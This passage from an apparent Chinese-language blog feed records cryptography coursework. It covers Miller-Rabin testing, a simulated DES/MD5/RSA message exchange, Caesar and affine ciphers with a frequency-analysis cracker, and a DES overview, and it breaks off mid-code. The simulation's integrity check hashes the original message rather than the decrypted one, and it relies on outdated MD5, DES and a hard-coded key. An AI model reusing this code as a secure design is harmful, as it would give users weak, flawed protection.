class="keyword">def</span> <span class="title">miller_rabin_witness</span><span class="params">(a, p)</span>:</span></span><br><span class="line">  <span class="keyword">if</span> p == <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">if</span> p == <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">  <span class="comment">#p-1 = u*2^t 求解 u, t</span></span><br><span class="line">  n = p - <span class="number">1</span></span><br><span class="line">  t = int(math.floor(math.log(n, <span class="number">2</span>)))</span><br><span class="line">  u = <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> t &gt; <span class="number">0</span>:</span><br><span class="line">    u = n / <span class="number">2</span>**t</span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">2</span>**t == <span class="number">0</span> <span class="keyword">and</span> u % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    t = t - <span class="number">1</span></span><br><span class="line">  b1 = b2 = xn_mod_p2(a, u, p)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, t + <span class="number">1</span>):</span><br><span class="line">    b2 = b1**<span class="number">2</span> % p</span><br><span class="line">    <span class="keyword">if</span> b2 == <span class="number">1</span> <span class="keyword">and</span> b1 != <span class="number">1</span> <span class="keyword">and</span> b1 != (p - <span class="number">1</span>):</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    b1 = b2</span><br><span class="line">  <span class="keyword">if</span> b1 != <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prime_test_miller_rabin</span><span class="params">(p, k)</span>:</span></span><br><span class="line">  <span class="keyword">while</span> k &gt; <span class="number">0</span>:</span><br><span class="line">    a = randint(<span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> miller_rabin_witness(a, p):</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    k = k - <span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">num = input(<span class="string">u"请输入要进行Miller-Rabin算法检测的数："</span>)</span><br><span class="line"><span class="keyword">if</span> prime_test_miller_rabin(int(num),<span class="number">10</span>):</span><br><span class="line"><span class="keyword">print</span> (<span class="string">u"&#123;0&#125;大概率是素数"</span>.format(num))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> (<span class="string">u"&#123;0&#125;是合数 "</span>.format(num))</span><br></pre></td></tr></table></div></figure><p><strong>实例演示：</strong></p><p><img src="/2019/01/15/crypto2/3.png" alt="demo"></p>        <h1 id="通信过程模拟">          <a href="#通信过程模拟" class="heading-link"><i class="fas fa-link"></i></a>通信过程模拟</h1>      <p>​    有了前面的算法基础，我们现在可以模拟出一个从Alice到Bob的通信过程，步骤如下:</p><p><img src="/2019/01/15/crypto2/4.png" alt="demo"></p><p>​    接下来用代码详细模拟了一下该过程</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> des</span><br><span class="line"></span><br><span class="line">print(<span class="string">"现在开始模拟Alice到Bob之间的通信过程："</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">'*******Alice的发送准备*********'</span>)</span><br><span class="line">print()</span><br><span class="line">message = <span class="string">"Hello! Bob, I'm Alice! We could communicate with each other now, It's so great!"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设定message哈希值</span></span><br><span class="line">message_hash = md5.encrypt(message)</span><br><span class="line">sign = rsa.rsa_encrypt(message_hash)</span><br><span class="line">key = <span class="string">"infosecu"</span></span><br><span class="line">print(<span class="string">"Alice想要发送到明文信息: "</span>,message)</span><br><span class="line">print(<span class="string">"Alice的DES秘钥："</span>, key)</span><br><span class="line">print(<span class="string">"消息哈希(用于检验消息完整性): "</span>,message_hash)</span><br><span class="line">print(<span class="string">"Alice签名: "</span>, sign)</span><br><span class="line"></span><br><span class="line">print()</span><br><span class="line">print(<span class="string">'公开信道上传输DES加密数据'</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">'*******sending...**********'</span>)</span><br><span class="line">print()</span><br><span class="line">send_mess = des.encrypt(message,key)</span><br><span class="line">send_sign = des.encrypt(sign,key)</span><br><span class="line">print(<span class="string">"message: "</span>,send_mess)</span><br><span class="line">print(<span class="string">"sign: "</span>,send_sign)</span><br><span class="line">print(<span class="string">"message_hash: "</span>,message_hash)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">'********sending finish*******'</span>)</span><br><span class="line">print()</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"********Bob处理收到的信息********"</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"DES解密对应的内容："</span>)</span><br><span class="line">b_sign = des.decrypt(send_sign,key)</span><br><span class="line">b_mess = des.decrypt(send_mess,key)</span><br><span class="line">print(<span class="string">"Alice发送的明文message： "</span>,b_mess)</span><br><span class="line">print(<span class="string">"消息签名sign： "</span>,b_sign)</span><br><span class="line">print()</span><br><span class="line">b_mess_hash = md5.encrypt(message)</span><br><span class="line">print(<span class="string">"此时Bob自己求出明文哈希值： "</span>, b_mess_hash)</span><br><span class="line">print(<span class="string">"之后与Alice发送的消息哈希进行校验"</span>)</span><br><span class="line">print(<span class="string">"...****...."</span>)</span><br><span class="line"></span><br><span class="line">print(b_mess_hash,<span class="string">"=="</span>,message_hash,<span class="string">"消息在传输过程中没有出错! 但是无法确定是否是Alice所发。"</span>)</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line">vert = rsa.rsa_decrypt(sign)</span><br><span class="line">print(<span class="string">"Bob对签名进行RSA解密： "</span>,vert)</span><br><span class="line">print(<span class="string">"对解密后的签名值与自己计算出的MD5值相比较来验证发送方身份.."</span>)</span><br><span class="line">print(<span class="string">"verting....."</span>)</span><br><span class="line"><span class="keyword">if</span> vert == b_mess_hash:</span><br><span class="line">print(<span class="string">"message is ok. 此时Bob可以确认从Alice处收到了完整的信息。"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"message is broken."</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"通信过程完成，Bob收到了Alice的信息！"</span>)</span><br></pre></td></tr></table></div></figure><p><strong>实例演示：</strong></p><p><img src="/2019/01/15/crypto2/5.png" alt="demo"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;接上篇&lt;/p&gt;
    
    </summary>
    
      <category term="Record" scheme="http://chaosec.top/categories/Record/"/>
    
    
      <category term="Crypto" scheme="http://chaosec.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>密码学作业记录（一）</title>
    <link href="http://chaosec.top/2019/01/15/crypto1/"/>
    <id>http://chaosec.top/2019/01/15/crypto1/</id>
    <published>2019-01-15T14:28:46.000Z</published>
    <updated>2019-01-30T11:44:17.367Z</updated>
    
    <content type="html"><![CDATA[        <h1 id="前言">          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a>前言</h1>      <p>最近在学习密码学，研究了一些密码学算法，特此记录一下。</p><a id="more"></a>        <h1 id="古典密码">          <a href="#古典密码" class="heading-link"><i class="fas fa-link"></i></a>古典密码</h1>      <p>古典密码体制是基于古代落后的计算条件和落后的密码学与数学知识建立的，本部分选取了<strong>凯撒密码</strong>和<strong>仿射密码</strong>。</p>        <h2 id="凯撒密码">          <a href="#凯撒密码" class="heading-link"><i class="fas fa-link"></i></a>凯撒密码</h2>      <p>凯撒密码本质上是一种置换密码，且为一对一的置换加密方式。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。这个加密方法是以罗马共和时期恺撒的名字命名的，当年恺撒曾用此方法与其将军们进行联系。</p><p><em>代码如下</em></p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 名密文输入范围是26个英文小写字母</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">"encrypt"</span>:</span><br><span class="line">plain = raw_input(<span class="string">"Please input plaintext: "</span>)</span><br><span class="line">key = input(<span class="string">"Please input key: "</span>)</span><br><span class="line">cip = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain)):</span><br><span class="line">temp = (ord(plain[i]) - ord(<span class="string">'a'</span>) + key) % <span class="number">26</span> + ord(<span class="string">'a'</span>)</span><br><span class="line">cip += chr(temp)</span><br><span class="line">print(<span class="string">"cipher: "</span> + cip)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> mode == <span class="string">"decrypt"</span>:</span><br><span class="line">cipher = raw_input(<span class="string">"Please input cipher: "</span>)</span><br><span class="line">key = input(<span class="string">"Please input key: "</span>)</span><br><span class="line">pla = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">temp = (ord(cipher[i])-ord(<span class="string">"a"</span>) - key) % <span class="number">26</span> + ord(<span class="string">'a'</span>)</span><br><span class="line">pla += chr(temp)</span><br><span class="line">print(<span class="string">"plaintext: "</span> + pla)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(sys.argv[<span class="number">1</span>],<span class="string">" is not supported:("</span>)</span><br></pre></td></tr></table></div></figure><p><img src="/2019/01/15/crypto1/1.png" alt="demo"></p><blockquote><p>安全性分析：可以看到，凯撒密码的加解密方式简单，手工即可实现，在古代落后的计算能力之下，该中算法拥有着很高的安全性，但是放在现在由于计算能力的提高，该算法表现出脆弱性，无法抵抗穷举攻击，因为对于一串明文，可能的加密组合只有26种，以现在的计算手段，对于任何攻击方式都表现出极大的脆弱性，当遭受<strong>已知明文攻击</strong>时完全没有抵抗性，故而现代密码体制中已不再采用该密码。</p></blockquote>        <h2 id="仿射密码">          <a href="#仿射密码" class="heading-link"><i class="fas fa-link"></i></a>仿射密码</h2>      <p>仿射密码的加密算法就是一个线性变换，及对任意的明文字符x，对应的密文字符为 <code>y≡e(x)≡ax+b(mod 26)</code>，其中a,b均为26以内的正整数，并且要求<code>gcd(a,26)=1</code>，函数e(x)称为仿射加密函数，解密时用<code>x≡d(e(x))≡a&#39;(e(x)-b)(mod 26)</code>来解密。</p><p><em>代码如下：</em></p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_re</span><span class="params">(a)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">27</span>):</span><br><span class="line"><span class="keyword">if</span> i*a % <span class="number">26</span> == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="comment"># ex = ax+b</span></span><br><span class="line">mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">"e"</span>:</span><br><span class="line">p = str(input(<span class="string">"Plz input plain: "</span>))</span><br><span class="line">a = int(input(<span class="string">"Plz input a: "</span>))</span><br><span class="line">b = int(input(<span class="string">"Plz input b: "</span>))</span><br><span class="line">c = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(p)):</span><br><span class="line">t = ((ord(p[i]) - ord(<span class="string">'a'</span>)) * a + b) % <span class="number">26</span> + ord(<span class="string">'a'</span>)</span><br><span class="line">c += chr(t)</span><br><span class="line">print(<span class="string">"cipher: "</span> + c)</span><br><span class="line"><span class="keyword">elif</span> mode == <span class="string">"d"</span>:</span><br><span class="line"><span class="comment"># a'(e(x)-b)</span></span><br><span class="line">c = str(input(<span class="string">"Plz input cipher: "</span>))</span><br><span class="line">a = int(input(<span class="string">"Plz input a: "</span>))</span><br><span class="line">b = int(input(<span class="string">"Plz input b: "</span>))</span><br><span class="line">p = <span class="string">""</span></span><br><span class="line">_a = get_re(a)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)): </span><br><span class="line">t = (ord(c[i]) - ord(<span class="string">'a'</span>) - b)*_a % <span class="number">26</span> + ord(<span class="string">'a'</span>)</span><br><span class="line">p += chr(t)</span><br><span class="line">print(<span class="string">"plain: "</span> + p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"Input Error:("</span>)</span><br></pre></td></tr></table></div></figure><blockquote><p>加密时按照加密公式给出，解密时用穷举法求出a的逆元从而解密。</p></blockquote><p><em>实例演示</em></p><p><img src="/2019/01/15/crypto1/2.png" alt="demo"></p><hr><p>　　可以看到，仿射加密和凯撒加密本质都是一种一对一的加密方式，这种加密方式没有将字母出现的统计规律隐藏起来，在英文中对于足够长的英文文本来说，字符的出现频率是相对固定的，还有字母的有些组合出现频率也是相对固定的，这样就可以通过统计分析法来破解上述加密方式加密出来的密文。</p><p><em>频率分析法破解仿射密码</em></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">假如我们已知一串密文 fmxvedkaphferbndkrxrsrefmorudsdkdvshvufedkaprkdlyevlrhhrh，</span><br><span class="line">此时可以通过频率分析法尝试爆破出明文</span><br></pre></td></tr></table></div></figure><p><em>代码如下</em></p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">dic = [<span class="string">'e'</span>,<span class="string">'t'</span>,<span class="string">'a'</span>,<span class="string">'o'</span>,<span class="string">'i'</span>,<span class="string">'n'</span>,<span class="string">'s'</span>,<span class="string">'h'</span>,<span class="string">'r'</span>,<span class="string">'d'</span>,<span class="string">'l'</span>,<span class="string">'c'</span>,<span class="string">'u'</span>,<span class="string">'m'</span>,<span class="string">'w'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'y'</span>,<span class="string">'p'</span>,<span class="string">'b'</span>,<span class="string">'v'</span>,<span class="string">'k'</span>,<span class="string">'j'</span>,<span class="string">'x'</span>,<span class="string">'q'</span>,<span class="string">'z'</span>]</span><br><span class="line">freq = [<span class="number">0</span>] * <span class="number">26</span></span><br><span class="line">cipher = input(<span class="string">"Plz input cipher: "</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 频率统计</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">t = ord(cipher[i])-ord(<span class="string">'a'</span>)</span><br><span class="line">freq[t] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ab</span><span class="params">(x,y)</span>:</span></span><br><span class="line">dic = [<span class="string">'e'</span>,<span class="string">'t'</span>,<span class="string">'a'</span>,<span class="string">'o'</span>,<span class="string">'i'</span>,<span class="string">'n'</span>,<span class="string">'s'</span>,<span class="string">'h'</span>,<span class="string">'r'</span>,<span class="string">'d'</span>,<span class="string">'l'</span>,<span class="string">'c'</span>,<span class="string">'u'</span>,<span class="string">'m'</span>,<span class="string">'w'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'y'</span>,<span class="string">'p'</span>,<span class="string">'b'</span>,<span class="string">'v'</span>,<span class="string">'k'</span>,<span class="string">'j'</span>,<span class="string">'x'</span>,<span class="string">'q'</span>,<span class="string">'z'</span>]</span><br><span class="line">repeat = []   <span class="comment"># 去除重复计算的项</span></span><br><span class="line"><span class="keyword">for</span> one <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> two <span class="keyword">in</span> dic:</span><br><span class="line">o = ord(one) - ord(<span class="string">'a'</span>)</span><br><span class="line">t = ord(two) - ord(<span class="string">'a'</span>)</span><br><span class="line">oo = ord(x) - ord(<span class="string">'a'</span>)</span><br><span class="line">tt = ord(y) - ord(<span class="string">'a'</span>)</span><br><span class="line"><span class="comment"># oo = a*o+b</span></span><br><span class="line"><span class="comment"># tt = a*t+b</span></span><br><span class="line"><span class="keyword">if</span> o - t == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">a = ((oo-tt)//(o-t)) % <span class="number">26</span></span><br><span class="line">b = (oo - a * o) % <span class="number">26</span></span><br><span class="line">test =  int(gmpy2.gcd(a, <span class="number">26</span>))</span><br><span class="line"><span class="keyword">if</span> test != <span class="number">1</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">_a = gmpy2.invert(a, <span class="number">26</span>)</span><br><span class="line">plain = <span class="string">""</span></span><br><span class="line"><span class="keyword">if</span> (a,b) <span class="keyword">in</span> repeat:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> cipher:</span><br><span class="line">ex = ord(item) - ord(<span class="string">'a'</span>)</span><br><span class="line">p = (_a * (ex - b)) % <span class="number">26</span></span><br><span class="line">plain += chr(p+ord(<span class="string">'a'</span>))</span><br><span class="line">repeat.append((a,b))</span><br><span class="line">print(plain,end=<span class="string">""</span>)</span><br><span class="line">print(<span class="string">"**"</span> + str(a) + <span class="string">"**"</span> + str(b))</span><br><span class="line">print(<span class="string">"共"</span> + str(len(repeat)) + <span class="string">"项."</span>)</span><br><span class="line"></span><br><span class="line">x = chr(freq.index(max(freq)) + ord(<span class="string">'a'</span>))</span><br><span class="line">freq[freq.index(max(freq))] = <span class="number">0</span></span><br><span class="line">y = chr(freq.index(max(freq)) + ord(<span class="string">'a'</span>))</span><br><span class="line">get_ab(x,y)</span><br></pre></td></tr></table></div></figure><p>代码思路是先统计密文的字母出现频率，由频率高低依次对应字母频次表，联立方程组，由于未知数只有a、b，所以只需要两个方程是即可解出，依次尝试不同的变换组合即可，直至得到有意义的明文，由于统计基数的原因，密文越长，则越可能早的得到有意义的密文。为了使结果显示更加有效，代码中过滤了冗余的待选明文项（即a、b相同的情况）。</p><p><img src="/2019/01/15/crypto1/3.png" alt="demo"></p><p>可以看到密文被成功破解</p><hr><p>　　从对古典密码分析中可以看到，一个密码体系要保证安全性，应该尽可能的隐藏语言特性，即密文均匀分布，且加密的可选字符区间应尽可能的大，否则无法抵抗穷举攻击。在现代密码体制中，这两点都有了比较好的保证。</p>        <h1 id="分组密码">          <a href="#分组密码" class="heading-link"><i class="fas fa-link"></i></a>分组密码</h1>              <h2 id="DES加密算法">          <a href="#DES加密算法" class="heading-link"><i class="fas fa-link"></i></a>DES加密算法</h2>      <p>DES算法为密码体制中的对称密码体制，又被称为美国数据加密标准，是1972年美国IBM公司研制的对称密码体制加密算法。 明文按64位进行分组，密钥长64位，密钥事实上是56位参与DES运算（第8、16、24、32、40、48、56、64位是校验位， 使得每个密钥都有奇数个1）分组后的明文组和56位的密钥按位替代或交换的方法形成密文组。 </p><p>DES加密流程如下图</p><p><img src="/2019/01/15/crypto1/5.png" alt="demo"></p><p>解密时只需要将机密流程逆序即可。</p><p>算法大致步骤如下：</p><ol><li>初始置换</li></ol><p>​DES算法使用64位的密钥key将64位的明文输入块变为64位的密文输出块，并把输出块分为L0、R0两部分，每部分均为32位。初始置换规则可查表获得，这里不再赘述。初始置换是固定的、公开的函数，因此这个初始置换及逆初始置换都没有密码意义，主要目的是为了更好地将明文和密文分组。</p><hr><p>下一步是进行轮函数（F函数）迭代，F函数具体步骤如下</p><ol><li>扩展置换（E盒）</li></ol><p>初始置换结束后，将得到64位序列分成两组，各32位，而E盒将数据的右32位输入扩展为48位输出，改变了位的次序，重复了某些位。</p><p>该步骤的目的是：a、产生与秘钥相同长度的数据以进行异或运算，R0是32位，子秘钥是48位，所以R0要先进行扩展置换之后与子秘钥进行异或运算；b、提供更长的结果，使得在替代运算时能够进行压缩。</p><ol><li>秘钥加运算</li></ol><p>该步骤非常简单，将E扩展输出的48位与48位子秘钥进行逐位异或，输出48位数据。</p><ol><li>代换盒（S盒）</li></ol><p>此步骤的功能是进行非线性变换，S盒是DES中唯一的非线性部分，经过S盒代换压缩之后，48位的数据重新被压缩成32位。</p><p>代换压缩由8个不同的代替盒(S盒)完成。每个S-盒有6位输入，4位输出。所以48位的输入块被分成8个6位的分组，每一个分组对应一个S-盒代替操作。经过S-盒代替，形成8个4位分组结果</p><p>S盒具有良好的非线性，输入的每一个比特与全部输入比特有关，两个输入相差1比特时，输入至少相差2比特，极大的保证了安全性。</p><ol><li>置换运算（P盒）</li></ol><p>置换运算（P盒）只是进行简单位置置换，而不进行扩展和压缩。</p><p>至此<strong>F函数</strong>结束</p><hr><ol><li>逆置换</li></ol><p>将初始置换进行16次的迭代，即进行16层的加密变换，这个运算过程我们暂时称为<strong>F函数</strong>。得到L16和R16，将此作为输入块，进行逆置换得到最终的密文输出块。</p><p><em>代码如下：</em></p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span 